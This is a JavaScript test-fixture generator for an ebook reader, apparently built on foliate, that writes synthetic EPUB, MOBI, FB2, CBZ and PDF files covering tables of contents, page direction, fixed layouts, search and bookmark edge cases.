/** tscover.epub (a non-linear cover first), tsfixed.epub (pre-paginated text), tsdup.epub (one href twice in its spine), tsimage.epub (#1265: images), tsfixedimg.epub (a pre-paginated image page), tsthree.cbz, tsformat.epub, tsrtl.epub (spine rtl, English text), tshe.epub (Hebrew, no spine direction), tsformat.mobi, tsdrm.mobi (the same with the DRM flag), tsformat.fb2, tsformat.fbz, tsformat.cbz (2 pages), tsformat.pdf, tsoutline.pdf, tscjk.pdf, tslocked.pdf, tsjpx.pdf (#1204: a JPEG 2000 image). */
export function writeFormatFixtures(dir) {
  // Its details and cover for `describe` (#1426): two authors, an HTML description, a cover image outside the spine.
  epub(resolve(dir, 'tsformat.epub'), 'TS EPUB', {
    files: { 's1.xhtml': xhtml('', `<h1>Chapter One</h1>${prose(30).map((p) => `<p>${p}</p>`).join('')}`), 'cover.png': png(1200, 1800, [40, 120, 200]) },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/><item id="cover" href="cover.png" media-type="image/png" properties="cover-image"/>',
    spine: '<itemref idref="s1"/>',
    lang: 'en-US',
    meta: '<dc:creator>Ada Writer</dc:creator><dc:creator>Bo Second</dc:creator><dc:description>&lt;p&gt;A &lt;b&gt;small&lt;/b&gt; book.&lt;/p&gt;</dc:description>',
  })
  // A spine page-progression-direction of rtl over English text (#1263): foliate's paginator lays it out left to
  // right (by the text's direction); only a fixed layout spreads by the spine's.
  epub(resolve(dir, 'tsrtl.epub'), 'TS RTL', {
    files: { 's1.xhtml': xhtml('', `<p>${para}</p>`) },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/>',
    spineAttrs: ' page-progression-direction="rtl"',
  })
  // A nested TOC with a repeated label (#1261): `opened.toc` carries depth, `relocate.tocIndex` tells the two "Notes" apart.
  epub(resolve(dir, 'tstoc.epub'), 'TS TOC', {
    files: {
      ...Object.fromEntries([1, 2, 3].map((i) => [`s${i}.xhtml`, xhtml('', `<h1>Section ${i}</h1><p>${para}</p>`)])),
      'nav.xhtml': `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol><li><a href="s1.xhtml">Part One</a><ol><li><a href="s2.xhtml">Notes</a></li></ol></li><li><a href="s3.xhtml">Notes</a></li></ol></nav></body></html>`,
    },
    manifest: [1, 2, 3].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2, 3].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // #1316, chapters as contents entries: two entries in one file (Beta nested under Alpha, starting on a new page in
  // paginated flow, after a last paragraph long enough to break over pages and some white space), Beta running on
  // into a second file of several pages, Gamma the last; and a book with no contents at all.
  epub(resolve(dir, 'tschapters.epub'), 'TS CHAPTERS', {
    files: {
      's1.xhtml': xhtml('<style>h1.new { break-before: column } .pn { display: none }</style>', `<h1 id="a">Alpha</h1>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>${para.repeat(8)}Alpha ends here.</p>\n<!-- white space, in two text nodes -->\n<span epub:type="pagebreak" class="pn">12</span><h1 id="b" class="new">Beta</h1><p>Beta begins.</p>`),
      's2.xhtml': xhtml('', `${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>Beta ends in a second file.</p>`),
      's3.xhtml': xhtml('', `<h1>Gamma</h1>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>Gamma is the last chapter.</p>`),
      'nav.xhtml': `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol><li><a href="s1.xhtml#a">Alpha</a><ol><li><a href="s1.xhtml#b">Beta</a></li></ol></li><li><a href="s3.xhtml">Gamma</a></li></ol></nav></body></html>`,
    },
    manifest: [1, 2, 3].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2, 3].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // A chapter split by size, not at its entries: Alpha runs on into the second file, Beta starts lower down in it.
  epub(resolve(dir, 'tssplit.epub'), 'TS SPLIT', {
    files: {
      's1.xhtml': xhtml('', '<h1 id="a">Alpha</h1><p>Alpha, part one.</p>'),
      's2.xhtml': xhtml('<style>h1.new { break-before: column }</style>', `<p>Alpha goes on in the second file.</p>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>Alpha ends in the second file.</p><h1 id="b" class="new">Beta</h1><p>Beta is the last chapter.</p>`),
      'nav.xhtml': navOf('<li><a href="s1.xhtml#a">Alpha</a></li><li><a href="s2.xhtml#b">Beta</a></li>'),
    },
    manifest: [1, 2].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // Contents that do not match the file: an anchor the file does not have (after another entry of the file, and as
  // a file's first entry), entries listed out of the document's order, a front-matter title, chapters with no text
  // (after text in a file, and a file of its own), a last chapter that runs over two files.
  epub(resolve(dir, 'tsanchors.epub'), 'TS ANCHORS', {
    files: {
      's1.xhtml': xhtml('', '<h1 id="one">One</h1><p>One text.</p><h1 id="three">Three</h1><p>Three text.</p><h1 id="two">Two</h1><p>Two text.</p><div id="fig"><svg xmlns="http://www.w3.org/2000/svg" width="60" height="40"><rect width="60" height="40" fill="#48c"/></svg></div>'),
      's2.xhtml': xhtml('', '<p>Four text.</p>'),
      's3.xhtml': xhtml('', '<p><svg xmlns="http://www.w3.org/2000/svg" width="60" height="80"><rect width="60" height="80" fill="#c84"/></svg></p>'),
      's4.xhtml': xhtml('', '<h1>Copyright</h1><p>All rights reserved.</p>'),
      's5.xhtml': xhtml('', '<p>The last page of the book.</p>'),
      'nav.xhtml': navOf('<li><a href="s1.xhtml#one">One</a></li><li><a href="s1.xhtml#nope">Missing</a></li><li><a href="s1.xhtml#two">Two</a></li><li><a href="s1.xhtml#three">Three</a></li><li><a href="s1.xhtml#fig">Figure</a></li><li><a href="s2.xhtml#nope">Four</a></li><li><a href="s3.xhtml">Plate</a></li><li><a href="s4.xhtml">Copyright</a></li>'),
    },
    manifest: [1, 2, 3, 4, 5].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2, 3, 4, 5].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // #1316 review 2: entries that name a file only ("Chapter 2" -> s2.xhtml) before ones anchored in it ("2.1" ->
  // s2.xhtml#x), and a <section id> entry around its subsection's anchor: each starts at its place in the document.
  epub(resolve(dir, 'tsfilelevel.epub'), 'TS FILE LEVEL', {
    files: {
      's1.xhtml': xhtml('', '<h1>One</h1><p>One text.</p>'),
      's2.xhtml': xhtml('', `<p>Chapter 2 intro.</p><h2 id="x">2.1 X</h2>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>X ends.</p>`),
      's3.xhtml': xhtml('', `<section id="s3"><h1>Three</h1><p>Three intro.</p><h2 id="y">3.1 Y</h2>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>Y ends.</p></section>`),
      'nav.xhtml': navOf('<li><a href="s1.xhtml">One</a></li><li><a href="s2.xhtml">Chapter 2</a><ol><li><a href="s2.xhtml#x">2.1 X</a></li></ol></li><li><a href="s3.xhtml#s3">Three</a><ol><li><a href="s3.xhtml#y">3.1 Y</a></li></ol></li>'),
    },
    manifest: [1, 2, 3].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2, 3].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // Dead anchors listed between and after live ones: One, Missing (no such anchor), Two in one file; Two runs on into
  // the second file, where Three starts lower down and Gone (no such anchor) is listed last.
  epub(resolve(dir, 'tsdeadlast.epub'), 'TS DEAD LAST', {
    files: {
      's1.xhtml': xhtml('<style>h1.new { break-before: column }</style>', `<h1 id="one">One</h1>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>One ends.</p><h1 id="two" class="new">Two</h1>${prose(4).map((t) => `<p>${t}</p>`).join('')}`),
      's2.xhtml': xhtml('<style>h1.new { break-before: column }</style>', `<p>Two goes on.</p>${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>Two ends.</p><h1 id="three" class="new">Three</h1><p>Three text.</p>`),
      'nav.xhtml': navOf('<li><a href="s1.xhtml#one">One</a></li><li><a href="s1.xhtml#nope">Missing</a></li><li><a href="s1.xhtml#two">Two</a></li><li><a href="s2.xhtml#three">Three</a></li><li><a href="s2.xhtml#gone">Gone</a></li>'),
    },
    manifest: [1, 2].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // Contents whose entries lead nowhere in the book: a book with no contents, by the page's rule.
  epub(resolve(dir, 'tsdeadtoc.epub'), 'TS DEAD TOC', {
    files: {
      's1.xhtml': xhtml('', '<p>The only section.</p>'),
      'nav.xhtml': navOf('<li><a href="gone.xhtml">Gone</a></li><li><a href="missing.xhtml#x">Missing</a></li>'),
    },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/>',
  })
  epub(resolve(dir, 'tsnotoc.epub'), 'TS NO TOC', {
    files: {
      's1.xhtml': xhtml('', `${prose(12).map((t) => `<p>${t}</p>`).join('')}<p>The first section ends, no contents.</p>`),
      's2.xhtml': xhtml('', '<p>Second section.</p>'),
      'nav.xhtml': `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol></ol></nav></body></html>`,
    },
    manifest: [1, 2].map((i) => `<item id="s${i}" href="s${i}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: [1, 2].map((i) => `<itemref idref="s${i}"/>`).join(''),
  })
  // Right to left by language only (#1263): no spine attribute; foliate sets each section's dir from it.
  epub(resolve(dir, 'tshe.epub'), 'TS HE', {
    files: { 's1.xhtml': xhtml('', `<p>${para}</p>`) },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/>',
    lang: 'he',
  })
  // #1314: a line break, a style sheet and a noscript inside the first words (a bookmark's text keeps none of the last two).
  epub(resolve(dir, 'tsmarks.epub'), 'TS MARKS', {
    files: { 's1.xhtml': xhtml('', `<h1>Marks</h1><p>Line one<br/>Line two <style>p { margin: 0 }</style>and <noscript>no script here</noscript>more words.</p>${prose(8).map((p) => `<p>${p}</p>`).join('')}`) },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/>',
  })
  // #1315: one file under two contents entries, a hit under each, and a phrase broken by inline markup (five text nodes).
  epub(resolve(dir, 'tssearch.epub'), 'TS SEARCH', {
    files: {
      's1.xhtml': xhtml('', '<h2 id="a">Alpha</h2><p>A heron waits. The <em>quick</em> brown <em>fox</em> jumps here.</p><h2 id="b">Beta</h2><p>Another heron flies.</p><p>A stone\n      wall stands in Malmö.</p>'),
      'nav.xhtml': `<?xml version="1.0"?><html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>nav</title></head><body><nav epub:type="toc"><ol><li><a href="s1.xhtml#a">Alpha</a></li><li><a href="s1.xhtml#b">Beta</a></li></ol></nav></body></html>`,
    },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/>',
  })
  // #1315: an SVG spine item (a document with no body: nothing a search can read) between two sections of text.
  epub(resolve(dir, 'tssvgspine.epub'), 'TS SVG SPINE', {
    files: {
      's1.xhtml': xhtml('', '<p>The first kestrel is here.</p>'),
      'plate.svg': '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="#c84"/></svg>',
      's2.xhtml': xhtml('', '<p>The second kestrel is there.</p>'),
    },
    manifest: '<item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/><item id="plate" href="plate.svg" media-type="image/svg+xml"/><item id="s2" href="s2.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="s1"/><itemref idref="plate"/><itemref idref="s2"/>',
  })
  const html = `<html><head><guide></guide></head><body><h1>Chapter One</h1>${prose(30).map((p) => `<p>${p}</p>`).join('')}<mbp:pagebreak/><h1>Chapter Two</h1>${prose(30).map((p) => `<p>${p}</p>`).join('')}</body></html>`
  writeFileSync(resolve(dir, 'tsformat.mobi'), mobi('TS MOBI', html))
  writeFileSync(resolve(dir, 'tsdrm.mobi'), mobi('TS DRM', html, { encryption: 2 }))
  const book = fb2('TS FB2', fb2Section('Chapter One', prose(30)) + fb2Section('Chapter Two', prose(30)))
  writeFileSync(resolve(dir, 'tsformat.fb2'), book)
  zipFiles(resolve(dir, 'tsformat.fbz'), { 'book.fb2': book })
  zipFiles(resolve(dir, 'tsformat.cbz'), { 'p01.png': png(60, 80, [200, 40, 40]), 'p02.png': png(60, 80, [40, 40, 200]) })
  // Upper-case extensions (foliate keeps only lower case) and an SVG page (an image only when typed).
  zipFiles(resolve(dir, 'tsupper.cbz'), { 'P01.PNG': png(60, 80, [40, 200, 40]), 'P02.SVG': '<svg xmlns="http://www.w3.org/2000/svg" width="60" height="80"><rect width="60" height="80" fill="#c84"/></svg>' })
  // UTF-16LE with a BOM, declared as such: foliate decodes UTF-8 first, the page re-encodes it.
  writeFileSync(resolve(dir, 'tsutf16.fb2'), Buffer.from(`﻿${book.replace('encoding="utf-8"', 'encoding="UTF-16"')}`, 'utf16le'))
  writeFileSync(resolve(dir, 'tskf8.mobi'), mobi('TS KF8', html, { version: 8 }))
  writeFileSync(resolve(dir, 'tscombo.mobi'), mobi('TS COMBO', html, { boundary: 1 }))
  // A non-linear cover first (#1187): the text start is section 1, fraction 0 is section 0.
  epub(resolve(dir, 'tscover.epub'), 'TS COVER', {
    files: { 'c.xhtml': xhtml('', '<h1>Cover</h1>'), 's1.xhtml': xhtml('', `<h1>Chapter One</h1>${prose(30).map((p) => `<p>${p}</p>`).join('')}`) },
    manifest: '<item id="c" href="c.xhtml" media-type="application/xhtml+xml"/><item id="s1" href="s1.xhtml" media-type="application/xhtml+xml"/>',
    spine: '<itemref idref="c" linear="no"/><itemref idref="s1"/>',
  })
  // A pre-paginated EPUB with text (#1187): foliate's fixed-layout renderer, which reports no range. Three pages:
  // the 2nd and 3rd share a spread in a landscape view (#1268: a selection in one frame of two).
  epub(resolve(dir, 'tsfixed.epub'), 'TS FIXED', {
    meta: '<meta property="rendition:layout">pre-paginated</meta>',
    files: Object.fromEntries([1, 2, 3].map((n) => [`p${n}.xhtml`, xhtml('<meta name="viewport" content="width=600, height=800"/>', `<p>Page ${n}. ${para}</p>`)])),
    manifest: [1, 2, 3].map((n) => `<item id="p${n}" href="p${n}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: '<itemref idref="p1"/><itemref idref="p2"/><itemref idref="p3"/>',
  })
  // A pre-paginated EPUB whose spine lists p1 twice (#1196 review): the same page key at sections 0 and 2.
  epub(resolve(dir, 'tsdup.epub'), 'TS DUP', {
    meta: '<meta property="rendition:layout">pre-paginated</meta>',
    files: Object.fromEntries([1, 2].map((n) => [`p${n}.xhtml`, xhtml('<meta name="viewport" content="width=600, height=800"/>', `<p>Page ${n}. ${para}</p>`)])),
    manifest: [1, 2].map((n) => `<item id="p${n}" href="p${n}.xhtml" media-type="application/xhtml+xml"/>`).join(''),
    spine: '<itemref idref="p1"/><itemref idref="p2"/><itemref idref="p1"/>',
  })
  // Three pages: the 2nd and 3rd share a spread in a landscape view (foliate pairs pages after the first).
  zipFiles(resolve(dir, 'tsthree.cbz'), { 'p01.png': png(60, 80, [200, 40, 40]), 'p02.png': png(60, 80, [40, 200, 40]), 'p03.png': png(60, 80, [40, 40, 200]) })
  writeImageEpub(resolve(dir, 'tsimage.epub'))
  // A pre-paginated page with an image (#1265): the lightbox does not open on a fixed layout.
  epub(resolve(dir, 'tsfixedimg.epub'), 'TS FIXED IMAGE', {
    meta: '<meta property="rendition:layout">pre-paginated</meta>',
    files: { 'red.png': png(240, 160, [200, 40, 40]), 'p1.xhtml': xhtml('<meta name="viewport" content="width=600, height=800"/>', `<p>Page 1.</p><img src="red.png" alt="A red square" style="width:400px"/>`) },
    manifest: '<item id="p1" href="p1.xhtml" media-type="application/xhtml+xml"/><item id="red" href="red.png" media-type="image/png"/>',
    spine: '<itemref idref="p1"/>',
  })
  // PDF (#1128 S5): five text pages; one CJK page on a predefined cMap; one that needs a password.
  writeFileSync(resolve(dir, 'tsformat.pdf'), pdf(5))
  writeFileSync(resolve(dir, 'tscjk.pdf'), pdf(1, { title: 'TS CJK', cjk: true }))
  writeFileSync(resolve(dir, 'tslocked.pdf'), pdf(1, { title: 'TS LOCKED', locked: true }))
  writeFileSync(resolve(dir, 'tsjpx.pdf'), pdf(1, { title: 'TS JPX', jpx: RED_J2K }))
  // ADR-033 P3: an outline to pages 1 and 4 of 5.
  writeFileSync(resolve(dir, 'tsoutline.pdf'), pdf(5, { title: 'TS OUTLINE', outline: [{ title: 'Start', dest: (p) => `[${p[0]} /Fit]` }, { title: 'Four', dest: (p) => `[${p[3]} /Fit]` }] }))
  return ['tssearch.epub', 'tssvgspine.epub', 'tsformat.pdf', 'tsoutline.pdf', 'tscjk.pdf', 'tslocked.pdf', 'tsjpx.pdf', 'tscover.epub', 'tsfixed.epub', 'tsdup.epub', 'tsimage.epub', 'tsfixedimg.epub', 'tsthree.cbz', 'tsformat.epub', 'tsmarks.epub', 'tsrtl.epub', 'tshe.epub', 'tsformat.mobi', 'tsdrm.mobi', 'tsformat.fb2', 'tsformat.fbz', 'tsformat.cbz', 'tsupper.cbz', 'tsutf16.fb2', 'tskf8.mobi', 'tscombo.mobi']
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  mkdirSync(fixtures, { recursive: true })
  writeFontsEpub(resolve(fixtures, 'tsfonts.epub'))
  writeHostileEpub(resolve(fixtures, 'tshostile.epub'), process.argv[2])
  const formats = writeFormatFixtures(fixtures)
  console.log(['tsfonts.epub', 'tshostile.epub', ...formats].map((f) => `fixtures/${f}`).join(', '))
}
